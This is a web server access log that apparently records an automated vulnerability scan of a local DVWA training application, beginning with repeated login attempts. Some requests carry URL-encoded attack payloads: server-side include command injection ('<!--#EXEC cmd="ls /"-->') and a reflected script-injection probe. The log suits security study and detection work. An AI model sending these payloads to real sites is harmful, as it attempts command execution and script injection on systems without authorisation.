172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1864 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /robots.txt?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /robots.txt?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /robots.txt?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /robots.txt?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /setup.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /sitemap.xml?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /sitemap.xml?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /setup.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /sitemap.xml?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /sitemap.xml?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /setup.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /setup.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /?query=0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /about.php?query=0W45pz4p HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /?query=query0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /about.php?query=query0W45pz4p HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /about.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs?query=0W45pz4p HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/?query=0W45pz4p HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/DVWA_v1.3.pdf?query=0W45pz4p HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs?query=query0W45pz4p HTTP/1.1" 301 560 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/?query=query0W45pz4p HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 301 630 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/DVWA_v1.3.pdf?query=query0W45pz4p HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /docs/DVWA_v1.3.pdf?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa?query=0W45pz4p HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/?query=0W45pz4p HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css?query=0W45pz4p HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa?query=query0W45pz4p HTTP/1.1" 301 560 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/?query=0W45pz4p HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/?query=query0W45pz4p HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css?query=query0W45pz4p HTTP/1.1" 301 568 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/?query=query0W45pz4p HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 301 638 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/login.css?query=0W45pz4p HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/main.css?query=0W45pz4p HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/login.css?query=query0W45pz4p HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/login.css?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/main.css?query=query0W45pz4p HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/css/main.css?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images?query=0W45pz4p HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/?query=0W45pz4p HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images?query=query0W45pz4p HTTP/1.1" 301 574 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/login_logo.png?query=0W45pz4p HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/?query=query0W45pz4p HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/login_logo.png?query=query0W45pz4p HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
